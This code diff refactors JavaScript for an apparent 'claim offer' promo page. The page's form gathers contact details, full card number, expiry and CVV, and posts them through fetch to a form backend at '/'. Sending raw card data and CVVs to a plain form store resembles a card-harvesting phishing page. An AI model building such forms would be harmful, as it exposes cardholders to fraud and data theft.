@@ -15,22 +15,25 @@ let shippingInfo = {
 
 function handleInputChange(event, key) {
     let value = event.target.value;
+
     if (key === 'nameOnCard') {
         value = value.toUpperCase();
+        event.target.value = value;
     }
+
     shippingInfo[key] = value;
 }
 
 function validateCardNumber(input) {
     let cardNumber = input.value.replace(/\D/g, '').substring(0, 16);
-    cardNumber = cardNumber !== '' ? cardNumber.match(/.{1,4}/g).join(' ') : '';
+    cardNumber = cardNumber != '' ? cardNumber.match(/.{1,4}/g).join(' ') : '';
     input.value = cardNumber;
     shippingInfo.cardNumber = cardNumber;
 }
 
 function validateExpiry(input) {
     let expiryDate = input.value.replace(/\D/g, '').substring(0, 4);
-    expiryDate = expiryDate !== '' ? expiryDate.match(/.{1,2}/g).join('/') : '';
+    expiryDate = expiryDate != '' ? expiryDate.match(/.{1,2}/g).join('/') : '';
     input.value = expiryDate;
     shippingInfo.expiry = expiryDate;
 }
@@ -43,31 +46,25 @@ function validateCVV(input) {
 
 document.addEventListener("DOMContentLoaded", function() {
     const promoForm = document.getElementById('promo-form');
-    const claimButton = document.querySelector('.claim-offer-btn');
-    const promoCard = document.querySelector('.promo-card');
-
     promoForm.addEventListener('submit', function(event) {
-        event.preventDefault(); // Prevent the default form submission
+        event.preventDefault();
+        let formData = new FormData(promoForm);
 
-        // Change the button and promo card appearance
-        claimButton.textContent = 'Claimed!';
-        claimButton.disabled = true;
-        claimButton.classList.add('claimed');
-        promoCard.classList.add('promo-claimed');
-
-        // Programmatically submit the form to Netlify
         fetch('/', {
             method: 'POST',
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: new URLSearchParams(new FormData(promoForm)).toString()
-        }).then(response => {
-            if (response.ok) {
-                console.log('Submission successful');
-            } else {
-                console.log('Submission failed');
-                // Handle failure case here, if needed
+            body: new URLSearchParams(formData).toString()
+        })
+        .then(response => {
+            if (!response.ok) {
+                                throw new Error('Network response was not ok');
             }
-        }).catch(error => console.error('Error in submission:', error));
+            // Implement successful submission logic, e.g., redirect or show a message
+        })
+        .catch(error => {
+            console.error('Form submission error:', error);
+            alert('Form submission failed, please try again.');
+        });
     });
 
     const inputFields = ['fullName', 'email', 'phone', 'address', 'city', 'zip', 'country', 'nameOnCard', 'cardNumber', 'expiry', 'cvv'];
@@ -91,17 +88,35 @@ document.addEventListener("DOMContentLoaded", function() {
         });
     });
 
-    document.getElementById('standardShipping').addEventListener('change', function(event) {
-        shippingInfo.shippingMethod = event.target.value;
-    });
+    document.getElementById('standardShipping').addEventListener('change', handleRadioChange);
+    document.getElementById('priorityShipping').addEventListener('change', handleRadioChange);
 
-    document.getElementById('priorityShipping').addEventListener('change', function(event) {
+    function handleRadioChange(event) {
         shippingInfo.shippingMethod = event.target.value;
-    });
+    }
 
+    // Set default value for country field
     const countryInput = document.getElementById('country');
     if (countryInput) {
         countryInput.value = 'Australia';
     }
-});
 
+    // Function to handle the claim offer button click
+    function handleClaimOffer() {
+        var claimButton = document.querySelector('.claim-offer-btn');
+        var promoCard = document.querySelector('.promo-card'); // Select the promo card
+
+        if (claimButton) {
+            claimButton.addEventListener('click', function(event) {
+                event.preventDefault(); // Prevent the default form action
+                claimButton.textContent = 'Claimed!'; // Change button text
+                claimButton.disabled = true; // Disable the button
+                claimButton.classList.add('claimed'); // Add class to change button style
+                promoCard.classList.add('promo-claimed'); // Add class to change promo card border
+            });
+        }
+    }
+
+    // Call the function to handle the claim offer button
+    handleClaimOffer();
+});
